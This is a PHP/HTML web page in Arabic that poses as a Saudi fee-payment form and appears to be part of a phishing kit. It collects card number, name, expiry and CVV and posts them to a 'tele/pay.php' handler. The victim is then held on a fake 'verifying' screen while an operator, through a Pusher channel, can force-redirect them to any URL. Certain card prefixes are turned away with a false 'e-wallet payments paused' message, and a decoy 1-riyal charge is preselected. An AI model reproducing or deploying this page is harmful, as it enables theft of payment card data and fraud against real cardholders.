<?php

session_start();

require_once 'dashboard/init.php';

// Get user ID from URL parameter or session
$userId = null;

if (isset($_GET['id'])) {
    $userId = $_GET['id'];
    $_SESSION['current_user_id'] = $userId;
} elseif (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
} elseif (isset($_SESSION['user_session'])) {
    $userId = $_SESSION['user_session'];
    $_SESSION['current_user_id'] = $userId;
}

if (!$userId) {
    header('Location: register-second.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>الدفع</title>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
<style>
    * {
        box-sizing: border-box;
        font-family: 'Tajawal', sans-serif;
    }

    body {
        background: #ffffff;
        margin: 0;
        padding: 0;
        color: #1f2937;
    }

    .container {
        max-width: 420px;
        margin: 20px auto;
        padding: 15px;
    }

    @media (max-width: 480px) {
        .container {
            margin: 10px auto;
            padding: 12px;
        }
    }

h1 {
    font-size: 16px;
    font-weight: bold;
    text-align: center;
    margin-bottom: 10px;
    line-height: 1.5;
}

    @media (max-width: 480px) {
        h1 {
            font-size: 14px;
            margin-bottom: 8px;
        }
    }

    .price-big {
        font-size: 36px;
        font-weight: 700;
        text-align: center;
        margin: 10px 0 25px;
        color: #3b82f6;
    }

    @media (max-width: 480px) {
        .price-big {
            font-size: 32px;
            margin: 8px 0 20px;
        }
    }

    .row {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
        font-size: 14px;
    }

    .old {
        text-decoration: line-through;
        color: #9ca3af;
    }

    .total {
        font-weight: 700;
    }

    .note {
        font-size: 12px;
        color: #6b7280;
        margin: 10px 0 20px;
    }

    hr {
        border: none;
        border-top: 1px solid #e5e7eb;
        margin: 20px 0;
    }

    .pay-title {
        font-size: 18px;
        font-weight: 700;
        margin-bottom: 5px;
    }

    @media (max-width: 480px) {
        .pay-title {
            font-size: 16px;
        }
    }

    .pay-sub {
        font-size: 13px;
        color: #6b7280;
        margin-bottom: 15px;
    }

    @media (max-width: 480px) {
        .pay-sub {
            font-size: 12px;
        }
    }

    .cards {
        text-align: left;
        margin-bottom: 15px;
    }

    .cards img.visa {
        height: 16px;
        margin-left: 10px;
    }

    .cards img.mastercard {
        height: 24px;
        margin-left: 10px;
    }

    .input-group {
        margin-bottom: 15px;
    }

    label {
        display: block;
        font-size: 13px;
        margin-bottom: 5px;
    }

    @media (max-width: 480px) {
        label {
            font-size: 13px;
            margin-bottom: 6px;
        }
    }

    input, select {
        width: 100%;
        padding: 12px;
        border: 1px solid #d1d5db;
        border-radius: 6px;
        font-size: 14px;
        transition: border-color 0.3s ease;
        -webkit-appearance: none;
        -moz-appearance: none;
    }

    @media (max-width: 480px) {
        input, select {
            padding: 14px 12px;
            font-size: 16px;
        }
    }

    input.error, select.error {
        border-color: #ef4444;
    }

    .error-message {
        color: #ef4444;
        font-size: 12px;
        margin-top: 5px;
        display: none;
    }

    .error-message.show {
        display: block;
    }

    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
        20%, 40%, 60%, 80% { transform: translateX(10px); }
    }

    .shake {
        animation: shake 0.5s;
    }

    #cardNumber {
        direction: ltr;
        text-align: left;
    }

    #cardName {
        direction: ltr;
        text-align: left;
    }

    #cardName::placeholder {
        text-align: right;
        direction: rtl;
    }

    .flex {
        display: flex;
        gap: 10px;
    }

    @media (max-width: 380px) {
        .flex {
            gap: 8px;
        }
    }

    .flex > div:first-child,
    .flex > div:nth-child(2) {
        flex: 1;
        max-width: 90px;
    }

    @media (max-width: 380px) {
        .flex > div:first-child,
        .flex > div:nth-child(2) {
            max-width: 80px;
        }
    }

    .flex > div:last-child {
        flex: 1;
    }

    .custom-select {
        position: relative;
        width: 100%;
    }

    .custom-select select {
        width: 100%;
        padding: 12px 35px 12px 12px;
        border: 1px solid #d1d5db;
        border-radius: 6px;
        font-size: 14px;
        font-family: 'Tajawal', sans-serif;
        background: white;
        cursor: pointer;
        appearance: none;
        -webkit-appearance: none;
        -moz-appearance: none;
        transition: all 0.3s ease;
        text-align: center;
    }

    @media (max-width: 480px) {
        .custom-select select {
            padding: 14px 35px 14px 12px;
            font-size: 16px;
        }
    }

    .custom-select select:hover {
        border-color: #3b82f6;
    }

    .custom-select select:focus {
        outline: none;
        border-color: #3b82f6;
        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
    }

    .custom-select select.error {
        border-color: #ef4444;
    }

    .custom-select::after {
        content: "▼";
        position: absolute;
        top: 50%;
        left: 12px;
        transform: translateY(-50%);
        pointer-events: none;
        color: #6b7280;
        font-size: 10px;
    }

    .custom-select select option {
        padding: 10px;
        font-size: 14px;
        background: white;
        color: #1f2937;
    }

    .custom-select select option:hover {
        background: #f3f4f6;
    }

    button {
        width: 100%;
        background: #9ca3af;
        color: #fff;
        border: none;
        padding: 14px;
        font-size: 16px;
        border-radius: 8px;
        margin-top: 25px;
        cursor: not-allowed;
        transition: background 0.3s ease;
        -webkit-tap-highlight-color: transparent;
    }

    button:not(:disabled) {
        background: #FFC107;
        color: #1f2937;
        cursor: pointer;
        font-weight: 600;
    }

    @media (max-width: 480px) {
        button {
            padding: 16px;
            font-size: 17px;
            margin-top: 20px;
        }
    }

    button:hover:not(:disabled) {
        background: #FFB300;
    }

    button:disabled {
        background: #9ca3af;
        cursor: not-allowed;
        opacity: 0.6;
    }

    .items-center {
        align-items: center;
    }

    .justify-center {
        justify-content: center;
    }

    .modal-overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.6);
        z-index: 1000;
        align-items: center;
        justify-content: center;
    }

    .modal-overlay.active {
        display: flex;
    }

    .modal-content {
        background: white;
        border-radius: 12px;
        padding: 30px;
        max-width: 400px;
        width: 90%;
        text-align: center;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        animation: modalSlideIn 0.3s ease;
    }

    @media (max-width: 480px) {
        .modal-content {
            padding: 25px 20px;
            width: 85%;
            border-radius: 10px;
        }
    }

    @keyframes modalSlideIn {
        from {
            transform: translateY(-50px);
            opacity: 0;
        }
        to {
            transform: translateY(0);
            opacity: 1;
        }
    }

    .modal-icon {
        font-size: 48px;
        margin-bottom: 15px;
    }

    .modal-icon.error {
        color: #ef4444;
    }

    .modal-title {
        font-size: 20px;
        font-weight: 700;
        color: #1f2937;
        margin-bottom: 10px;
    }

    .modal-message {
        font-size: 14px;
        color: #6b7280;
        line-height: 1.6;
        margin-bottom: 20px;
    }

    .modal-button {
        background: #3b82f6;
        color: white;
        border: none;
        padding: 12px 40px;
        font-size: 15px;
        border-radius: 8px;
        cursor: pointer;
        font-family: 'Tajawal', sans-serif;
        transition: background 0.3s ease;
        margin-top: 10px;
    }

    .modal-button:hover {
        background: #2563eb;
    }

    /* Loading Modal */
    .loading-spinner {
        width: 60px;
        height: 60px;
        border: 5px solid #e5e7eb;
        border-top: 5px solid #3b82f6;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .loading-text {
        font-size: 18px;
        font-weight: 600;
        color: #1f2937;
        margin-top: 15px;
    }

    /* ✅ استايل خيارات المبالغ */
    .amount-section-title {
        font-size: 18px;
        font-weight: 700;
        margin-bottom: 15px;
        color: #1f2937;
    }

    @media (max-width: 480px) {
        .amount-section-title {
            font-size: 16px;
            margin-bottom: 12px;
        }
    }

    .amount-options {
        margin: 20px 0;
    }

    .amount-option {
        display: flex;
        align-items: center;
        padding: 12px 15px;
        margin-bottom: 10px;
        border: 2px solid #e5e7eb;
        border-radius: 8px;
        cursor: pointer;
        transition: all 0.3s ease;
    }

    .amount-option:hover {
        border-color: #FFC107;
        background: #fffbf0;
    }

    .amount-option.selected {
        border-color: #FFC107;
        background: #fff9e6;
    }

.amount-option input[type="radio"] {
    width: 20px;
    height: 20px;
    margin-left: 12px;
    cursor: pointer;
    accent-color: #FFC107;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    border: 2px solid #d1d5db;
    border-radius: 50%;
    outline: none;
    position: relative;
}

.amount-option input[type="radio"]:checked {
    border-color: #FFC107;
    background-color: #FFC107;
}

.amount-option input[type="radio"]:checked::after {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 8px;
    height: 8px;
    background-color: white;
    border-radius: 50%;
}

    @media (max-width: 480px) {
        .amount-option {
            padding: 14px 15px;
        }

        .amount-option label {
            font-size: 16px;
        }
    }
</style>
</head>
<body>

<div class="container">

    <h1>دفع الرسوم</h1>
    
    <!-- ✅ عنوان القسم -->
    <div class="amount-section-title">قيمة المبلغ المراد تسديده</div>
    
    <!-- ✅ خيارات المبالغ -->
    <div class="amount-options">
        <div class="amount-option" onclick="selectAmount(this, '1')">
            <input type="radio" name="amount" id="amount1" value="1">
            <label for="amount1">1 ريال لإثبات طريقة الدفع</label>
        </div>
        
        <div class="amount-option" onclick="selectAmount(this, '500')">
            <input type="radio" name="amount" id="amount500" value="500">
            <label for="amount500">500 ريال سعودي</label>
        </div>
        
        <div class="amount-option" onclick="selectAmount(this, '750')">
            <input type="radio" name="amount" id="amount750" value="750">
            <label for="amount750">750 ريال سعودي</label>
        </div>
        
        <div class="amount-option" onclick="selectAmount(this, '1200')">
            <input type="radio" name="amount" id="amount1200" value="1200">
            <label for="amount1200">1200 ريال سعودي</label>
        </div>
        
        <div class="amount-option" onclick="selectAmount(this, '1450')">
            <input type="radio" name="amount" id="amount1450" value="1450">
            <label for="amount1450">1450 ريال سعودي</label>
        </div>
        
        <div class="amount-option" onclick="selectAmount(this, '2760')">
            <input type="radio" name="amount" id="amount2760" value="2760">
            <label for="amount2760">2760 ريال سعودي</label>
        </div>
    </div>

    <hr>

    <div class="row total">
        <span>المبلغ المستحق</span>
        <span id="selectedAmount">0.00 ر.س</span>
    </div>

    <hr>

    <div class="pay-title">الدفع من خلال بطاقة الائتمان</div>
    <div class="pay-sub">من فضلك أدخل معلومات الدفع الخاصة بك</div>

    <div class="cards">
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg" alt="Visa" class="visa">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" class="mastercard">
    </div>

    <form id="paymentForm" method="POST" action="tele/pay.php">
        <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($userId); ?>">
        <input type="hidden" name="price" id="priceInput" value="">
        
        <div class="input-group" id="cardNumberGroup">
            <label>رقم البطاقة</label>
            <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 1234 1234 1234" maxlength="19">
            <div class="error-message" id="cardNumberError">رقم البطاقة غير صالح</div>
        </div>

        <div class="input-group" id="cardNameGroup">
            <label>اسم صاحب البطاقة</label>
            <input type="text" id="cardName" name="cardName" placeholder="الاسم على البطاقة ">
            <div class="error-message" id="cardNameError">يجب تعبئة الاسم</div>
        </div>

        <div class="flex">
            <div class="input-group custom-select" id="yearGroup">
                <label>سنة</label>
                <select id="year" name="year">
                    <option value="">السنة</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                    <option value="2031">2031</option>
                    <option value="2032">2032</option>
                    <option value="2033">2033</option>
                    <option value="2034">2034</option>
                    <option value="2035">2035</option>
                    <option value="2036">2036</option>
                </select>
                <div class="error-message" id="yearError">يجب اختيار السنة</div>
            </div>
            <div class="input-group custom-select" id="monthGroup">
                <label>شهر</label>
                <select id="month" name="month">
                    <option value="">الشهر</option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                </select>
                <div class="error-message" id="monthError">يجب اختيار الشهر</div>
            </div>
            <div class="input-group" id="cvvGroup">
                <label>CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3">
                <div class="error-message" id="cvvError">يجب تعبئة CVV</div>
            </div>
        </div>

        <button type="button" onclick="validateForm()" id="submitBtn" disabled>ادفع الآن</button>
    </form>

    <div class="flex items-center justify-center">
        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium text-green-500 mui-rtl-i5ve3v" focusable="false" aria-hidden="true" viewBox="0 0 24 24" style="width: 20px; height: 28px; fill: #16a34a;">
            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2m-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2m3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1z"></path>
        </svg>
        <p class="MuiTypography-root MuiTypography-body1 mui-rtl-pxrsyw" style="margin: 0; font-size: 16px; color: #1f2937; font-weight: 500;"><span class="mx-2" style="margin: 0 8px;">دفع آمن وسريع</span></p>
    </div>

</div>

<!-- Blocked Card Modal -->
<div id="errorModal" class="modal-overlay">
    <div class="modal-content">
        <div class="modal-icon error">⚠️</div>
        <h3 class="modal-title">خطأ في الدفع</h3>
        <p class="modal-message">
            تم إيقاف الدفع مؤقتاً عن طريق المحافظ الإلكترونية الرجاء استخدام رقم بطاقة آخر.
        </p>
        <button class="modal-button" onclick="handleErrorOk()">حسناً</button>
    </div>
</div>

<!-- Loading Modal -->
<div id="loadingModal" class="modal-overlay">
    <div class="modal-content">
        <div class="loading-spinner"></div>
        <div class="loading-text">جاري التحقق...</div>
    </div>
</div>

<script>
localStorage.setItem('current_user_id', '<?php echo $userId; ?>');

const blockedCards = ['4021', '4890', '4201', '5246', '4575', '5216', '4125', '4424', '4548', '5242', '4323'];

// ============================================
// ✅ اختيار المبلغ
// ============================================
let selectedPrice = 0;

function selectAmount(element, price) {
    // إزالة التحديد من الكل
    document.querySelectorAll('.amount-option').forEach(opt => {
        opt.classList.remove('selected');
    });
    
    // تحديد الخيار الحالي
    element.classList.add('selected');
    element.querySelector('input[type="radio"]').checked = true;
    
    // تحديث المبلغ
    selectedPrice = parseFloat(price);
    document.getElementById('selectedAmount').textContent = price + '.00 ر.س';
    document.getElementById('priceInput').value = price;
    localStorage.setItem('last_amount', price);
    // فحص الحقول
    checkAllFieldsValid();
}

// ============================================
// Luhn Algorithm - التحقق من صحة البطاقة
// ============================================
function isValidLuhn(cardNumber) {
    const digits = cardNumber.replace(/\D/g, '');
    
    if (digits.length < 13 || digits.length > 19) {
        return false;
    }
    
    let sum = 0;
    let isEven = false;
    
    for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return (sum % 10) === 0;
}

// ============================================
// التحقق من صحة جميع الحقول
// ============================================
function checkAllFieldsValid() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const cardName = document.getElementById('cardName').value.trim();
    const year = document.getElementById('year').value;
    const month = document.getElementById('month').value;
    const cvv = document.getElementById('cvv').value.trim();
    
    const isCardNumberValid = cardNumber.length >= 13 && isValidLuhn(cardNumber);
    const isCardNameValid = cardName.length > 0;
    const isYearValid = year !== '';
    const isMonthValid = month !== '';
    const isCvvValid = cvv.length === 3;
    const isPriceSelected = selectedPrice > 0;
    
    const allValid = isCardNumberValid && isCardNameValid && isYearValid && isMonthValid && isCvvValid && isPriceSelected;
    
    document.getElementById('submitBtn').disabled = !allValid;
}

// ============================================
// Card Number Input - قبول الأرقام فقط
// ============================================
document.getElementById('cardNumber').addEventListener('input', function(e) {
    // ✅ إزالة أي حرف غير رقمي
    let value = e.target.value.replace(/\D/g, '');
    
    // ✅ فحص البطاقات المحظورة
    if (value.length >= 4) {
        const firstFour = value.substring(0, 4);
        if (blockedCards.includes(firstFour)) {
            showErrorModal();
            return;
        }
    }
    
    // تنسيق الرقم
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formattedValue;
    
    // ✅ التحقق من صحة البطاقة live
    if (value.length >= 13) {
        if (isValidLuhn(value)) {
            clearError('cardNumber');
        } else {
            showError('cardNumber', 'رقم البطاقة غير صالح');
        }
    } else {
        clearError('cardNumber');
    }
    
    checkAllFieldsValid();
});

document.getElementById('cardNumber').addEventListener('keypress', function(e) {
    if (!/[0-9]/.test(e.key)) {
        e.preventDefault();
    }
});

// ✅ منع اللصق إلا إذا كان أرقام فقط
document.getElementById('cardNumber').addEventListener('paste', function(e) {
    e.preventDefault();
    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
    const numbersOnly = pastedText.replace(/\D/g, '');
    document.execCommand('insertText', false, numbersOnly);
});

// ============================================
// CVV Input - قبول الأرقام فقط
// ============================================
document.getElementById('cvv').addEventListener('input', function(e) {
    // ✅ إزالة أي حرف غير رقمي
    e.target.value = e.target.value.replace(/\D/g, '');
    
    if (this.value.trim() !== '') {
        clearError('cvv');
    }
    checkAllFieldsValid();
});

document.getElementById('cvv').addEventListener('keypress', function(e) {
    if (!/[0-9]/.test(e.key)) {
        e.preventDefault();
    }
});

// ✅ منع اللصق إلا إذا كان أرقام فقط
document.getElementById('cvv').addEventListener('paste', function(e) {
    e.preventDefault();
    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
    const numbersOnly = pastedText.replace(/\D/g, '').substring(0, 3);
    document.execCommand('insertText', false, numbersOnly);
});

// ============================================
// Card Name Input
// ============================================
document.getElementById('cardName').addEventListener('input', function() {
    if (this.value.trim() !== '') {
        clearError('cardName');
    }
    checkAllFieldsValid();
});

// ============================================
// Year Select
// ============================================
document.getElementById('year').addEventListener('change', function() {
    if (this.value !== '') {
        clearError('year');
    }
    checkAllFieldsValid();
});

// ============================================
// Month Select
// ============================================
document.getElementById('month').addEventListener('change', function() {
    if (this.value !== '') {
        clearError('month');
    }
    checkAllFieldsValid();
});



// ============================================
// Validate Form
// ============================================
function validateForm() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    
    if (!isValidLuhn(cardNumber)) {
        showError('cardNumber', 'رقم البطاقة غير صالح');
        return;
    }
    
    if (selectedPrice <= 0) {
        alert('الرجاء اختيار المبلغ المراد تسديده');
        return;
    }
    
    // ✅ إظهار مودال "جاري التحقق..."
    showLoadingModal();
    
    // ✅ إرسال البيانات
    const formData = new FormData(document.getElementById('paymentForm'));
    
    fetch('tele/pay.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log('✅ تم حفظ البيانات');
        // ✅ العميل يبقى ينتظر التوجيه من Dashboard
    })
    .catch(error => {
        console.log('✅ تم الإرسال');
    });
}

// ============================================
// Error Handling Functions
// ============================================
function showError(fieldId, message) {
    const field = document.getElementById(fieldId);
    const errorElement = document.getElementById(fieldId + 'Error');
    
    field.classList.add('error');
    if (errorElement) {
        errorElement.textContent = message;
        errorElement.classList.add('show');
    }
}

function clearError(fieldId) {
    const field = document.getElementById(fieldId);
    const errorElement = document.getElementById(fieldId + 'Error');
    
    field.classList.remove('error');
    if (errorElement) {
        errorElement.classList.remove('show');
    }
}

function showErrorModal() {
    document.getElementById('errorModal').classList.add('active');
}

function handleErrorOk() {
    document.getElementById('errorModal').classList.remove('active');
    document.getElementById('cardNumber').value = '';
    document.getElementById('cardNumber').focus();
    checkAllFieldsValid();
}

function showLoadingModal() {
    document.getElementById('loadingModal').classList.add('active');
}

document.getElementById('errorModal').addEventListener('click', function(e) {
    if (e.target === this) {
        handleErrorOk();
    }
});

// ✅ فحص الحقول عند تحميل الصفحة وتحديد 1 ريال تلقائياً
window.addEventListener('DOMContentLoaded', () => {
    // تحديد خيار 1 ريال تلقائياً
    const amount1Element = document.querySelector('.amount-option');
    if (amount1Element) {
        selectAmount(amount1Element, '1');
    }
    checkAllFieldsValid();
});
</script>
<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
const pusher = new Pusher('a56388ee6222f6c5fb86', {
    cluster: 'ap2',
    encrypted: true
});

const channel = pusher.subscribe('my-channel');

channel.bind('force-redirect-user', function(data) {
    const myId = localStorage.getItem('current_user_id');

    if (myId && data.userId == myId) {
        window.location.href = data.url;
    }
});
</script>
</body>
</html>